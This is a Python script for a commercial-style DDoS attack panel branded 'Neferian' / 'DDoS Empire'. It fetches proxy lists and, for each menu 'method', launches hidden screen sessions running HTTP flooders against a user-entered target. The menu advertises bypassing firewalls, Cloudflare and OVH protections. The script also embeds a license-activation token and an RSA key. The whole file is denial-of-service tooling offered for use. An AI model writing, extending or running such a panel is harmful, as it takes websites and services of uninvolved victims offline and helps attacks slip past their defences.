import os
import sys
import time
import array as arr
from subprocess import run
from time import sleep
from shutil import which
from licensing.models import *
from licensing.methods import Key, Helpers
import os

RSAPubKey = "<RSAKeyValue><Modulus>t4Y9kOr0fa4qPLz50orfy4kJnlUMfNBYL5A5oS8hNBoQLskg234y1MuczQWrYwATHUaCsovgzgVKMlDnqfjR2K8nTexDizmWNnw4PSCZrKwjlD51F8SNNZvlMxdRzBeZ+7wIxbnYTuWoZ0hVSPlb39NTyPZBU9X8l698DvAK/xxfYaWqF+Z/1dfDXJ1wo/Bjljgvm44r66IZhm9RrR/wVqPsLYxIUnrICi4yY6q4HvXJwi0Jl6SbKstDw7+/7mTST6NoDniDvNEueDglY2pHF8G8b78ooebMrnu8sllB5fhmzEBgPnsbX1vuvFJsanbiazOvO2SEMF9f5Vt4LNCS/w==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>"
auth = "WyIzNTE5NjMyMyIsIjRZWW9NZU1EaFB4NDN3d1VCRStLbGg5bVpDbmdEZjBId25VdG1SemkiXQ=="
def Authkey():
    key = str(input(" Enter Auth Key :-"))
    result = Key.activate(token=auth,\
        rsa_pub_key=RSAPubKey,\
        product_id=18430, \
        key=key,\
        machine_code=Helpers.GetMachineCode())

    if result[0] == None or not Helpers.IsOnRightMachine(result[0]):
    # an error occurred or the key is invalid or it cannot be activated
    # (eg. the limit of activated devices was achieved)
        print("The license does not work: {0}".format(result[1]))
        exit()
    else:
    # everything went fine if we are here!
        print("The license is valid!")
        pass
Authkey()
        #edited by @tcpNeferian


try:
	requests = __import__("httpx")
	from colorama import Fore, Back, Style
	from rich.console import Console
except Exception:
	exit("[X] Error? try this pip3 install requirements.txt")

console = Console()
tasks = [f"task {n}" for n in range(1, 3)]
with console.status("[bold green]Finding missing on files...") as status:
	while tasks:
		task = tasks.pop(0)
		sleep(1)
		console.log(f"{task} complete")
		try:
			with open("key.txt"):
				open("requirements.txt")
				open("install.sh")
				print("[X] All files Scanned Completed!")
		except IOError:
			exit("[X] Some files does not exist, Please install again!")


def getproxy() -> None:
#	print("[+] Checking Proxy Providers...")
	print("[+] Please wait...")
	with open("proxy_providers.txt", mode="r") as readurl:
#		print("[+] Downloading Proxies...")
		for url in readurl:
			url = url.strip()
			with open("proxy.txt", mode="a") as file:
				try:
					file.write(requests.get(url, timeout=1000).text)
				except requests.ConnectError:
					exit("[X] Connection Error")
				except KeyboardInterrupt:
					exit()
		print("[+] Attack Sent Successfully!!")
		print("[+] Type 'STOP' to stop your Attack.")


def OSclear():
	os.system('clear' if os.name == 'posix' else 'cls')


def unavail():
	print("""
╔════════════════════════════════════════════════════════════════════════╗
║            SORRY THE METHOD YOU ARE TRYING IS UNAVAILABLE              ║           
╚════════════════════════════════════════════════════════════════════════╝
    """)
 
def tos():
	print("""\033[1;31;40m
╔════════════════════════════════════════════════════════════════════════╗
║                            \033[2;30;42mTERMS OF SERVICE\033[1;31;40m                            ║
╠════════════════════════════════════════════════════════════════════════╣
║ Welcome To Neferian DDoS Panel                                         ║
╚════════════════════════════════════════════════════════════════════════╝

    """)
	while 1:
		accept = input("Do You Accept The Rules? [Y/N]: ")
		if accept in ["y", "Y", "yes", "YES"]:
			sleep(2)
			print("[X] Loading...")
			menu()
		elif accept in ["n", "N", "no", "NO"]:
			sleep(2)
			exit("You have to accept the rules to use the script")
		elif accept in "":
			pass
		else:
			OSclear()
			tos()


def banner():
	print("""\033[1;32;40m
    \033[1;31;40m-- [ \033[2;30;42mDDoS Empire private Panel\033[1;31;40m ] --\033[1;32;40m
 _   _       __           _
| \ | | ___ / _| ___ _ __(_) __ _ _ __  
|  \| |/ _ \ |_ / _ \ '__| |/ _` | '_ \ 
| |\  |  __/  _|  __/ |  | | (_| | | | |
|_| \_|\___|_|  \___|_|  |_|\__,_|_| |_|
                                        Telegram:Neferian
                                        """)

def repeater():
	while 1:
		repeat = input("[Neferian Bot] Do you want to go back to menu? [Y/N]: ")
		if repeat in ["y", "Y", "yes", "YES"]:
			sleep(2)
			print("[X] Proceeding...")
			menu()
		elif repeat in ["n", "N", "no", "NO"]:
			exit()
		elif repeat in "":
			pass
		else:
			OSclear()
			menu()


def menu():
	OSclear()
	banner()
	print("""
╔════════════════════════════════════════════════════════════╗
║    [1] USER INFO \033[1;32;40m[See user info, VIP or NON-VIP]\033[1;31;40m           ║
║    [2] METHODS \033[1;32;40m[View Methods]\033[1;31;40m                              ║
║    [3] FILE UPDATE \033[1;32;40m[You can see new updates in our Files]  \033[1;31;40m║
╚════════════════════════════════════════════════════════════╝

    """)
	while 1:
		choose1 = input("root@neferian@#~> ")
		if choose1 in ["1", "user", "userinfo", "info"]:
			userinfo()
		elif choose1 in ["2", "methods", "METHODS"]:
			launchflood()
		elif choose1 in ["3", "fileupdate", "update"]:
			fileupdate()
		elif choose1 in ["dev", "developer"]:
			developer()
		elif (choose1 == ""):
			pass

#UserINFO
def userinfo():
    OSclear()
    print("""
╔════════════════════════════════════════════════════════════╗
║     USER TYPE: \033[1;32;40mFREE-USER        \033[1;31;40m                           ║
║     ADMIN PERM: \033[1;32;40mNO PERMISSION     \033[1;31;40m                         ║
║     ATTACK TIME: \033[1;32;40mUNLIMITED       \033[1;31;40m                          ║
║     USER EXPIRATION: \033[1;32;40mJanuary 1, 2038    \033[1;31;40m                   ║
║     METHODS ACCESS: \033[1;32;40mTRUE              \033[1;31;40m                     ║
╚════════════════════════════════════════════════════════════╝
    """)
    repeater()

def methodbanner():
	print("""
╔═════════════════╦═══════════════════════╦══════════════════════╦═════════════════════╗
║    \033[1;37;40mMETHODS      \033[1;31;40m║      \033[1;37;40mINFORMATION      \033[1;31;40m║      \033[1;37;40mPERMISSION      \033[1;31;40m║       \033[1;37;40mSTATUS        \033[1;31;40m║
╠═════════════════╬═══════════════════════╬══════════════════════╬═════════════════════╣
║  \033[1;36;40mNeferian-TLS       \033[1;31;40m║ \033[1;36;40mBYPASS SOME FIREWALLS \033[1;31;40m║      \033[1;36;40mVIP-USER       \033[1;31;40m║      \033[2;30;42mAVAILABLE\033[1;31;40m      ║
╠═════════════════╬═══════════════════════╬══════════════════════╬═════════════════════╣
║   \033[1;36;40mNeferian-STORM    \033[1;31;40m║  \033[1;36;40mBYPASS NORMAL CLOUD  \033[1;31;40m║      \033[1;36;40mVIP-USER       \033[1;31;40m║      \033[2;30;42mAVAILABLE\033[1;31;40m      ║
╠═════════════════╬═══════════════════════╬══════════════════════╬═════════════════════╣
║   \033[1;36;40mNeferian-HTTPS    \033[1;31;40m║  \033[1;36;40mHTTPS-PROXY ATTACK   \033[1;31;40m║      \033[1;36;40mVIP-USER       \033[1;31;40m║      \033[2;30;42mAVAILABLE\033[1;31;40m      ║
╠═════════════════╬═══════════════════════╬══════════════════════╬═════════════════════╣
║   \033[1;36;40mNeferian-NULL     \033[1;31;40m║ \033[1;36;40mBYPASS OVH-DIGI SITES \033[1;31;40m║      \033[1;36;40mVIP-USER       \033[1;31;40m║      \033[2;30;42mAVAILABLE\033[1;31;40m      ║
╠═════════════════╬═══════════════════════╬══════════════════════╬═════════════════════╣
║   \033[1;36;40mNeferian-UAM      \033[1;31;40m║ \033[1;36;40mBYPASS CLOUDFLARE UAM \033[1;31;40m║      \033[1;36;40mVIP-USER       \033[1;31;40m║     \033[1;31;47mUNAVAILABLE\033[1;31;40m     ║
╚═════════════════╩═══════════════════════╩══════════════════════╩═════════════════════╝
    """)
  
def launchflood():
	OSclear()
	methodbanner()
	while 1:
		methods = input("[X] Choose Method: ")
		if methods in ["Neferian-TLS", "Neferian-tls"]:
			try:
				target = input("[X] Target: ")
				getproxy()
				run([f'screen -dm go run main.go {target} 60  proxy.txt 2 ua.txt HEAD 10 '], shell=True)
			except:
				print("Error try again")
		elif methods in ["Neferian-STORM", "Neferian-storm"]:
			try:
				target = input("[X] Target: ")
				floodtime = int(input("[X] Time: "))
				thread = int(input("[X] Threads [5-10]: "))
				getproxy()
				run([f'screen -dm ./httpflooder {target} {floodtime} {thread} proxy.txt '], shell=True)
			except:
				print("Error try again")
		elif methods in ["Neferian-HTTPS", "Neferian-https"]:
			try:
				target = input("[X] Target: ")
				floodtime = int(input("[X] Time: "))
				thread = int(input("[X] Threads [5-10]: "))
				getproxy()
				run([f'screen -dm ./httpflooder {target} {floodtime} {thread} proxy.txt '], shell=True)
			except:
				print("Error try again")
		elif  methods in ["Neferian-NULL", "Neferian-null"]:
			try:
				target = input("[X] Target: ")
				floodtime = int(input("[X] Time: "))
				thread = int(input("[X] Threads [5-10]: "))
				getproxy()
				run([f'screen -dm ./httpflooder {target} {floodtime} {thread} proxy.txt '], shell=True)
			except:
				print("Error try again")
		elif methods in ["Neferian-UAM", "Neferian-uam"]:
			unavail()
			repeater()
		elif methods in "":
			pass
		elif methods in ["clear", "CLEAR", "cls", "CLS"]:
			OSclear(); methodbanner()
		elif methods in ["stop", "STOP"]:
			run(["pkill screen"], shell=True)
			print("[+] Attack Stopped!")
		else:
		   print("[X] Invalid Method")


#FileUpdates
def fileupdate():
    OSclear()
    print("""
lalala
    """)
    repeater()

#DeveloperInfo
def developer():
    OSclear()
    print("""
╔════════════════════════════════════════════════════════════╗
║     DEVELOPER: @tcpNeferian                                    ║
║     DDoS Empire: neferian & wriase & janissary             ║        
╚════════════════════════════════════════════════════════════╝

    """)
    repeater()

def main():
	print("[+] Checking Dependencies...\n")
	pkgs = ['screen']
	install = True
	for pkg in pkgs:
		ok = which(pkg)
		if ok == None:
			print(f"[X] {pkg} is not installed!\n")
			install = False
		else:
			pass
	if install == False:
		exit(f'[?] Error? try: sh install.sh')
	else:
		OSclear()
		tos()

if __name__ == "__main__":
	main()
